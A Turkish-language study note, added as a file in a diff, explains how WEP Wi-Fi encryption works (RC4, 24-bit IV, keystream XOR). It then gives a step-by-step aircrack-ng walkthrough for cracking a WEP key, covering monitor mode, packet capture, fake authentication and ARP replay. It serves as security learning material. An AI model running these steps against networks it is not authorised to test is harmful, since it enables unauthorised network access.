@@ -1,0 +1,95 @@
+
+--------------------------
+
+	WEP NEDİR ?
+
+* WEP : Wired Equivalent Privacy
+
+* WEP, veriyi şifrelemek için RC4 (Rivest Cipher 4) algoritmasını kullanır ve veri paketlerini şifrelerken bir gizli anahtar ve 
+Initialization Vector (IV) denilen bir başlangıç vektörünü birleştirir.
+* WEP, 64 bit, 128 bit ve 256 bit gibi farklı anahtar uzunluklarına sahiptir
+
+----------------------------
+
+	WEP KAVRAMLAR
+
+1. WEP Anahtarı :
+	- Ağ yöneticisi tarafından belirlenen ve ağdaki tüm istemciler ile erişim noktası (AP) arasında paylaşılan gizli  bir anahtardır.
+	- WEP anahtarı, veriyi şifrelemek ve çözmek için kullanılan temel bileşendir.
+	- Ağa bağlanmak için girilen değer.
+
+2. Initialization Vector (IV) : 
+	- 24 bit uzunluğunda bir rastgele sayıdır.
+	- IV, her veri paketinin şifrelenmesi sırasında kullanılır ve WEP anahtarına eklenerek paketlerin farklı şekilde şifrelenmesini sağlar.
+	- Ancak IV, her veri paketine açık bir şekilde eklenir (şifrelenmeden gönderilir). Bunun amacı, her paketin farklı bir anahtarla
+	şifrelenmesini sağlamaktır.
+
+3. RC4 Şifreleme Algoritması : 
+	- WEP, şifreleme işlemi için RC4 algoritmasını kullanır. RC4, bir keystream (şifreleme akışı) üretir. 
+	- Bu akış, verinin üzerine uygulanarak veriyi şifreler.
+
+4. Keystream (Şifreleme Akışı): 
+	- WEP anahtarı ve IV birleştirildiğinde RC4 algoritması tarafından üretilen bir şifreleme akışıdır. 
+	- Her veri paketi, bu keystream ile XOR işlemi yapılarak şifrelenir.
+
+--------------------------
+
+	WEP NASIL ÇALIŞIR
+
+* AP, cliente şifreli veri gönderir :
+
+	1. WEP Anahtarı + IV = Şifreleme Anahtarı
+	2. Şifreleme Anahtarı -> RC4 Algoritması ile birlikte = "Key Stream" oluşturur.
+	3. Key Stream + Gönderilecek Mesaj = Şifreli Mesaj
+	4. Şifrelenmiş Paket + IV (Açık bir şekilde)	->	Gönderilir
+		- Her bir pakette farklı bir IV kullanılır. 
+		- Belli bir paketten sonra IV'ler tekrar etmeye başlar. Netice de IV'lerde sonsuz değildir.
+
+* Client şifreyi çözer :
+
+	1. Client kendisine gelen paketteki IV ile birlikte zaten kendisinde var olan WEP anahtarını kullanarak şifreleme anahtarını oluşturur.
+	2. Oluşturduğu şifreleme anahtarını RC4 Algorisması ile birlikte KeyStream oluşturur.
+	3. Gelen şifreli veriyi oluşturduğu KeyStream ile XOR yaparak çözer.
+
+--------------------------
+
+Tools:
+
+	1. airmon-ng 	(for start wifi interface as monitor mode)
+	2. aircrack-ng 	(crack wifi packets)
+	3. airodump-ng 	(for monitor wifi networks)
+	4. aireplay-ng 	(for do arp replay attack and deauthentication attack to the target wifi networks)
+
+--------------------------
+
+	WEP ŞİFRELEMELİ MODEM HACKLEME
+
+
+1. airmon-ng start wlan0 
+	- Wifi kartını monitör moda alıyoruz
+
+2. airodump-ng wlan0
+	- Ağları tarıyoruz
+
+3. airodump-ng  --channel <AP Kanalı> --bssid <AP MAC> --write <Dosya Adı> wlan0
+	- Bir önceki aşamada topladığımı verilerden AP'nin MAC adresi ve kanalını öğrendikten sonra bu ağı özel bir şekilde dinliyoruz
+
+IF : Ağda çok az trafik varsa ya da hiç yoksa, ARP paketlerini yeniden oynatarak (replay) sahte trafik yaratabiliriz.
+	Station'lar var ama canlı bir trafik yoksa IV'lerin oluşturulması gerekiyor. Bunun için sahte bir trafik yapmak gerekebilir.
+
+	4. aireplay-ng --fakeauth 0 -a <AP Mac> -h <Kendi Wlan Mac> wlan0
+		- Kendimizi kırmak istediğimiz ağa bağlıymışız gibi gösteriyoruz
+		- Gerçekten modem'e bağlı olmasak da airodum-ng ile baktığımızda modeme bağlıymışız gibi gözükürüz.
+
+	5. aireplay-ng --arpreplay -b <AP Mac> -h <Kendi Wlan Mac> wlan0
+		- Kendimizi bağlıymışız gibi gösterdikten sonra bize gelecek şekilde AP'ye fake IV'ler ürettiriyoruz.
+
+6. aircrack-ng <Dosya Adı>.cap
+	- airodump ile ağ bilgilerini yazdırdığımız .cap uzantılı dosyayı yazıyoruz.
+	- Bu dosya içindeki paketleri inceleyerek ilgili ağın Wep Anahtarını bulmaya çalışır. 
+
+
+NOT : Toplanılan IV'leri arttırmsk için bunlar kullanılabilir : 
+	- ARP replay, chopchop, fragmentation, deauthentication
+
+----------------------------
